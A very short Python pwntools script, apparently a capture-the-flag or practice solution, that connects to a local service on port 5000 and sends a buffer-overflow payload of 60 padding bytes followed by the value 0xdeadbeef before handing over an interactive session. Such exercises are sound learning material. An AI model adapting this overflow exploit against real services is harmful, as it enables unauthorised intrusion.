from pwn import *

r = remote('localhost', 5000)

r.sendline(b'A'*60 + p32(0xdeadbeef))

r.interactive()
